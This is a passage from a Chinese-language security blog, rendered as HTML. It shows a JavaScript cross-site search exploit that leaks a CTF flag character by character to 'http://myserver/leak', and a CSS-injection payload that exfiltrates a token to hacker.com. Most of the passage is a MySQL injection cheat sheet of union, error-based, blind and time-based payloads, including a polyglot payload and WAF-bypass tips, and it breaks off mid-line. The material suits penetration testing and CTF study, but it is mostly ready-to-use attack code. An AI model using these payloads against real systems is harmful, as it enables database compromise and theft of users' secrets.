language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leak = &quot;</span> + leak + curChar);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x.<span class="property">contentWindow</span>.<span class="property">frames</span>.<span class="property">length</span> != <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://myserver/leak?&#x27;</span> + <span class="built_in">escape</span>(leak), &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            leak += curChar</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">search</span>(leak, (charCounter + <span class="number">1</span>) % chars.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">search</span>(<span class="string">&quot;fb&#123;&quot;</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">exploit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="基于-CSS-的跨站搜索攻击"><a href="#基于-CSS-的跨站搜索攻击" class="headerlink" title="基于 CSS 的跨站搜索攻击"></a>基于 CSS 的跨站搜索攻击</h2><p>获取标签属性值的可通过 CSS 选择器。</p>
<ul>
<li>dome.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$token1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]); <span class="comment">#假如 $token1 值为：admin</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;input type=hidden value=<span class="meta">&lt;?=</span><span class="variable">$token1</span> <span class="meta">?&gt;</span>&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;#&lt;/style#i&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;css&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
当可以注入 css 样式进行xss的时候，令 <code>$_GET[&#39;css&#39;]</code> &#x3D; <code>input[value^=&quot;a&quot;]&#123;background: url(http://hacker.com/)&#125;;</code>，将触发访问网站：<code>http://hacker.com/</code>。如此类推，即刻泄露全部 token 内容。</li>
</ul>
<p>CTF 示例：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3075">SECCON 2018 - Web Ghostkingdom</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/17/MySQL-%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/17/MySQL-%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" class="post-title-link" itemprop="url">MySQL 注入备忘录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-17 18:27:36 / Modified: 23:34:43" itemprop="dateCreated datePublished" datetime="2022-04-17T18:27:36+08:00">2022-04-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="MySQL-injection"><a href="#MySQL-injection" class="headerlink" title="MySQL injection"></a>MySQL injection</h1><p><strong>这是如何确认和执行 MySQL 注入的基本流程。欲了解更多信息，请访问:</strong> <a target="_blank" rel="noopener" href="https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md"><strong>https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md</strong></a></p>
<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MYSQL Comment</span></span><br><span class="line"># MYSQL Comment</span><br><span class="line"><span class="comment">/* MYSQL Comment */</span></span><br><span class="line"><span class="comment">/*! MYSQL Special SQL */</span></span><br><span class="line"><span class="comment">/*!32302 10*/</span> Comment <span class="keyword">for</span> MySQL version <span class="number">3.23</span><span class="number">.02</span></span><br><span class="line"><span class="comment">/*!50726 select version()*/</span> 向低版本兼容执行。<span class="operator">&lt;=</span> <span class="number">5.7</span><span class="number">.26</span> ，执行<span class="keyword">SQL</span>语句 。<span class="operator">&gt;</span> <span class="number">5.7</span><span class="number">.26</span> 作为注释符使用。</span><br></pre></td></tr></table></figure>

<h2 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<h2 id="MySQL-注入常用函数汇总"><a href="#MySQL-注入常用函数汇总" class="headerlink" title="MySQL 注入常用函数汇总"></a>MySQL 注入常用函数汇总</h2><h3 id="确认数据库类型为-Mysql-的函数"><a href="#确认数据库类型为-Mysql-的函数" class="headerlink" title="确认数据库类型为 Mysql 的函数"></a>确认数据库类型为 Mysql 的函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">concat(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line"><span class="keyword">user</span>()</span><br><span class="line"><span class="built_in">system_user</span>()</span><br><span class="line">@<span class="variable">@version</span></span><br><span class="line">@<span class="variable">@datadir</span></span><br><span class="line">rand()</span><br><span class="line"><span class="built_in">floor</span>(<span class="number">2.9</span>)</span><br><span class="line">length(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">count</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="MySQL-注入使用-函数"><a href="#MySQL-注入使用-函数" class="headerlink" title="MySQL 注入使用 函数"></a>MySQL 注入使用 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> hex(database())</span><br><span class="line"><span class="keyword">SELECT</span> conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>) # <span class="number">16</span> 进制 <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">10</span> 进制</span><br><span class="line"><span class="keyword">SELECT</span> DECODE(ENCODE(<span class="string">&#x27;cleartext&#x27;</span>, <span class="string">&#x27;PWD&#x27;</span>), <span class="string">&#x27;PWD&#x27;</span>) # Encode() <span class="operator">&amp;</span> decpde() <span class="keyword">returns</span> <span class="keyword">only</span> numbers</span><br><span class="line"><span class="keyword">SELECT</span> uncompress(compress(database())) # Compress <span class="operator">&amp;</span> uncompress() <span class="keyword">returns</span> <span class="keyword">only</span> numbers</span><br><span class="line"><span class="keyword">SELECT</span> replace(database(),&quot;r&quot;,&quot;R&quot;)</span><br><span class="line"><span class="keyword">SELECT</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x72</span></span><br><span class="line"><span class="keyword">SELECT</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span></span><br><span class="line"><span class="keyword">SELECT</span> database()<span class="operator">=</span><span class="type">char</span>(<span class="number">114</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">114</span>)</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(<span class="operator">&lt;</span><span class="keyword">COLUMN</span><span class="operator">&gt;</span>) <span class="keyword">FROM</span> <span class="operator">&lt;</span><span class="keyword">TABLE</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SELECT</span> group_concat(if(strcmp(table_schema,database()),table_name,<span class="keyword">null</span>))</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(<span class="keyword">CASE</span>(table_schema)<span class="keyword">When</span>(database())<span class="keyword">Then</span>(table_name)<span class="keyword">END</span>)</span><br><span class="line"></span><br><span class="line">group_concat() <span class="operator">=</span> <span class="number">1024</span> symbols</span><br><span class="line"><span class="built_in">json_arrayagg</span>() <span class="operator">&gt;</span> <span class="number">16</span>,<span class="number">000</span>,<span class="number">000</span> symbols</span><br><span class="line"></span><br><span class="line"># 盲注相关函数</span><br><span class="line"></span><br><span class="line">## 字符串比较、截取</span><br><span class="line">strcmp()</span><br><span class="line">mid()</span><br><span class="line">ldap()</span><br><span class="line">rdap()</span><br><span class="line"><span class="keyword">left</span>()</span><br><span class="line">rigth()</span><br><span class="line">instr()</span><br><span class="line">make_set()</span><br><span class="line"></span><br><span class="line">## 表达式比较 </span><br><span class="line">if(<span class="built_in">abs</span>(strcmp((ascii(mid(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">2</span>)))),<span class="number">114</span>))<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">find_in_set()</span><br><span class="line">regexp</span><br><span class="line">least(ord(<span class="string">&#x27;r&#x27;</span>),<span class="number">115</span>)、greatest(ord(<span class="string">&#x27;r&#x27;</span>),<span class="number">113</span>)</span><br><span class="line"><span class="keyword">between</span> n <span class="keyword">and</span> m</span><br><span class="line"></span><br><span class="line">## 时间相关函数</span><br><span class="line">sleep()</span><br><span class="line">BENCHMARK(<span class="number">40000000</span>,SHA1(<span class="number">1337</span>))</span><br><span class="line"><span class="keyword">OR</span> ELT([RANDNUM]<span class="operator">=</span>[RANDNUM],SLEEP([SLEEPTIME]))</span><br></pre></td></tr></table></figure>

<h2 id="全适用-Payload"><a href="#全适用-Payload" class="headerlink" title="全适用 Payload"></a>全适用 Payload</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> some_table <span class="keyword">WHERE</span> double_quotes <span class="operator">=</span> &quot;IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*&#x27;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#x27;|&quot;XOR(IF(SUBSTR(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">5</span>,BENCHMARK(<span class="number">2000000</span>,SHA1(<span class="number">0xDE7EC71F1</span>)),SLEEP(<span class="number">1</span>)))<span class="keyword">OR</span>&quot;*/&quot;</span><br></pre></td></tr></table></figure>

<p>from <a target="_blank" rel="noopener" href="https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/">https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/</a></p>
<h2 id="Mysql-注入流程"><a href="#Mysql-注入流程" class="headerlink" title="Mysql 注入流程"></a>Mysql 注入流程</h2><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute “<em><strong>information_schema.tables</strong></em>“ for “<em><strong>mysql.innodb_table_stats</strong></em><strong>“</strong> (This could be useful to bypass WAFs).</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database();#<span class="keyword">Get</span> name <span class="keyword">of</span> the tables</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>&quot;&lt;TABLE_NAME&gt;&quot;; #<span class="keyword">Get</span> name <span class="keyword">of</span> the columns <span class="keyword">of</span> the <span class="keyword">table</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span>COLUMN1<span class="operator">&gt;</span>,<span class="operator">&lt;</span>COLUMN2<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>TABLE_NAME<span class="operator">&gt;</span>; #<span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> file_priv<span class="operator">=</span><span class="string">&#x27;Y&#x27;</span>; #Users <span class="keyword">with</span> file privileges</span><br></pre></td></tr></table></figure>

<h3 id="Only-1-value"><a href="#Only-1-value" class="headerlink" title="Only 1 value"></a><strong>Only 1 value</strong></h3><ul>
<li><code>group_concat()</code></li>
<li><code>Limit X,1</code></li>
</ul>
<h3 id="Blind-one-by-one"><a href="#Blind-one-by-one" class="headerlink" title="Blind one by one"></a><strong>Blind one by one</strong></h3><ul>
<li><code>substr(version(),X,1)=&#39;r&#39;</code> or <code>substring(version(),X,1)=0x70</code> or <code>ascii(substr(version(),X,1))=112</code></li>
<li><code>mid(version(),X,1)=&#39;5&#39;</code></li>
</ul>
<h3 id="Blind-adding"><a href="#Blind-adding" class="headerlink" title="Blind adding"></a><strong>Blind adding</strong></h3><ul>
<li><code>LPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>RPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>SELECT RIGHT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT LEFT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT INSTR(&#39;foobarbar&#39;, &#39;fo...&#39;)=1</code></li>
</ul>
<h2 id="Detect-number-of-columns-amp-x20"><a href="#Detect-number-of-columns-amp-x20" class="headerlink" title="Detect number of columns&amp;#x20;"></a>Detect number of columns&amp;#x20;</h2><p>Using a simple ORDER</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">order by 1</span><br><span class="line">order by 2</span><br><span class="line">order by 3</span><br><span class="line">...</span><br><span class="line">order by XXX</span><br><span class="line"></span><br><span class="line">UniOn SeLect 1</span><br><span class="line">UniOn SeLect 1,2</span><br><span class="line">UniOn SeLect 1,2,3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-Union-Based"><a href="#MySQL-Union-Based" class="headerlink" title="MySQL Union Based"></a>MySQL Union Based</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,schema_name,<span class="number">0x7c</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.schemata</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,table_name,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">wHeRe</span><span class="operator">+</span>table_schema<span class="operator">=</span>...</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,column_name,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">wHeRe</span><span class="operator">+</span>table_name<span class="operator">=</span>...</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,data,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>...</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Error-Based"><a href="#MYSQL-Error-Based" class="headerlink" title="MYSQL Error Based"></a>MYSQL Error Based</h2><h3 id="MYSQL-Error-Based-Basic"><a href="#MYSQL-Error-Based-Basic" class="headerlink" title="MYSQL Error Based - Basic"></a>MYSQL Error Based - Basic</h3><p><strong>Works with MySQL &gt;&#x3D; 4.1</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(CONCAT(@<span class="variable">@VERSION</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x limit <span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Error-Based-UpdateXML-function"><a href="#MYSQL-Error-Based-UpdateXML-function" class="headerlink" title="MYSQL Error Based - UpdateXML function"></a>MYSQL Error Based - UpdateXML function</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="type">CHAR</span>(<span class="number">126</span>),version(),<span class="type">CHAR</span>(<span class="number">126</span>)),<span class="keyword">null</span>)<span class="operator">-</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),schema_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.schemata LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),TABLE_NAME,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>data_column LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),column_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span>data_table LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),data_info,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> data_table.data_column LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>Shorter to read:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(null,concat(0x0a,version()),null)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="keyword">null</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h3 id="MYSQL-Error-Based-Extractvalue-function"><a href="#MYSQL-Error-Based-Extractvalue-function" class="headerlink" title="MYSQL Error Based - Extractvalue function"></a>MYSQL Error Based - Extractvalue function</h3><p><strong>Works with MySQL &gt;&#x3D; 5.1</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="type">CHAR</span>(<span class="number">126</span>),version(),<span class="type">CHAR</span>(<span class="number">126</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),schema_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.schemata LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),TABLE_NAME,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>data_column LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),column_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span>data_table LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),data_info,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> data_table.data_column LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="MYSQL-Error-Based-NAME-CONST-function-only-for-constants"><a href="#MYSQL-Error-Based-NAME-CONST-function-only-for-constants" class="headerlink" title="MYSQL Error Based - NAME_CONST function (only for constants)"></a>MYSQL Error Based - NAME_CONST function (only for constants)</h3><p><strong>Works with MySQL &gt;&#x3D; 5.0</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(<span class="keyword">user</span>(),<span class="number">1</span>),NAME_CONST(<span class="keyword">user</span>(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(database(),<span class="number">1</span>),NAME_CONST(database(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Blind"><a href="#MYSQL-Blind" class="headerlink" title="MYSQL Blind"></a>MYSQL Blind</h2><h3 id="MYSQL-Blind-with-substring-equivalent"><a href="#MYSQL-Blind-with-substring-equivalent" class="headerlink" title="MYSQL Blind with substring equivalent"></a>MYSQL Blind with substring equivalent</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">substring</span>(version(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">5</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">right</span>(<span class="keyword">left</span>(version(),<span class="number">1</span>),<span 